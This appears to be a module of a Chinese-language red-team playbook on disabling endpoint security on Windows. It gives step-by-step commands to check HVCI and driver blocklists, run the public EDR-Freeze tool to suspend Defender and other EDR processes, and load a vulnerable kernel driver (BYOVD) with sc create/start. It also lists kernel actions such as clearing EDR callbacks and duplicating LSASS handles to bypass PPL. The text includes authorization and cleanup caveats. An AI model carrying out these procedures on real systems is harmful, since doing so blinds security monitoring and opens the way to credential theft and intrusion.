# Kernel / BYOVD / EDR-Freeze / Neutralization

高权限路径。授权红队/靶场直接做。不要写成“通杀 EDR”。必须记录 build、HVCI、blocklist、驱动 hash、影响和恢复。

Impact：

```text
CONTROL      临时挂起用户态安全进程（EDR-Freeze）
HIGH         驱动加载 / callback 修改 / PPL 降级
DESTRUCTIVE  内核不稳定、安全栈崩溃、业务中断
```

---

## 1. 环境门控（每次必做）

```powershell
systeminfo | findstr /C:"OS Name" /C:"OS Version"
bcdedit /enum {current}
# Memory Integrity / HVCI
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# 已加载驱动
driverquery /v /fo csv > drivers.csv
```

记录：

```text
Windows build
Secure Boot
HVCI / Memory Integrity
Vulnerable driver blocklist 是否启用
EDR 产品 + 用户态进程 + 驱动名
当前权限（必须管理员/SYSTEM 才走本节）
```

HVCI 开启时，未签名/blocklist 驱动加载会直接失败。先看这个再谈 BYOVD。

---

## 2. EDR-Freeze — 用户态挂起（优先于 BYOVD）

公开研究：WerFaultSecure + MiniDumpWriteDump 竞争，把 Defender/EDR 用户态进程挂起。不必加载漏洞驱动。

- 工具：https://github.com/TwoSevenOneT/EDR-Freeze
- 文章：https://www.zerosalarium.com/2025/09/EDR-Freeze-Puts-EDRs-Antivirus-Into-Coma.html
- 作者验证：Windows 11 24H2 上 Defender

```text
权限：通常需要高完整度/管理员，且能指向目标 PID
PPL：PPL 保护进程能否被 WER 挂起取决于当前组合，先在同版本实验室验证
不是卸载 EDR 驱动，是让用户态进入 suspended
```

```bash
git clone https://github.com/TwoSevenOneT/EDR-Freeze.git
# 按 README 编译
```

```text
# 先确认目标安全进程 PID
Get-Process MsMpEng,CrowdStrike*,SentinelAgent,elastic-agent -ErrorAction SilentlyContinue

# 按当前二进制帮助为准；公开说明为：
EDR-Freeze.exe <pid> <milliseconds>
# 例：挂起 10 秒做实验
EDR-Freeze.exe 1234 10000
```

成功：

```text
目标安全进程 threads 为 Suspended
原被拦动作在窗口内可执行
超时后进程恢复，或手动恢复
```

然后 **立刻回原 Attack 模块把 shell/权限拿完**。不要把 Freeze 当持久化。

清理：等待超时；必要时重启 WinDefend / EDR 服务（授权范围内）。

---

## 3. BYOVD

只在 EDR-Freeze / 用户态不够，且 engagement 允许内核影响时。

### 3.1 先查 blocklist

```text
https://www.loldrivers.io
Microsoft recommended driver blocklist XML
目标机 CI / WDAC 是否已启用该 blocklist
```

经典 `RTCore64.sys`、`gdrv.sys`、`dbutil_2_3.sys`、`capcom.sys` **多数 2026 企业机已经拦**。不要当默认弹。

没有当前未被拦、可验证 hash 的驱动：

```text
标 NO-STABLE-UNBLOCKED-DRIVER
改走 EDR-Freeze / 用户态
不编造 sc create 命令
```

### 3.2 加载流程（有合格驱动时）

```text
1. 记录驱动文件 SHA256 与签名者
2. 确认不在 blocklist、HVCI 允许
3. 复制到测试路径（不要覆盖系统驱动）
4. sc create / sc start 或官方加载器
5. 确认服务 Running
6. 用对应 PoC 做最小 kernel RW
7. 只对当前 EDR 需要的 callback / 句柄动手
8. 验证原被拦动作
9. sc stop / sc delete，恢复服务
```

```cmd
certutil -hashfile vulnerable.sys SHA256
sc create byovd_test type= kernel binPath= C:\Windows\Temp\vulnerable.sys
sc start byovd_test
# ... 最小利用 ...
sc stop byovd_test
sc delete byovd_test
del C:\Windows\Temp\vulnerable.sys
```

公开研究仓库（**版本/驱动随时过期，用前再对 blocklist**）：

- https://github.com/0xJs/BYOVD_read_write_primitive
- https://github.com/BlackSnufkin/BYOVD
- https://www.loldrivers.io

### 3.3 Kernel 动作范围

```text
清特定 EDR 进程回调
复制 LSASS 句柄绕 PPL
不要：无差别抹全部 callback / 卸所有 minifilter / 宣称 ETW-TI 永久关闭
```

不同产品恢复方式不同。有的用户态看起来 online，但 telemetry 已残。记 impact。

---

## 4. 成功 / 恢复

```text
SUCCESS: 原被拦动作在当前窗口可执行
STILL BLOCKED: kernel 不是正确层，回用户态
RESTORE:
- Freeze: 等超时 / 重启安全服务
- BYOVD: 停服务、删测试驱动、reboot 如果内核不稳
Resume: 原 Attack 模块
```
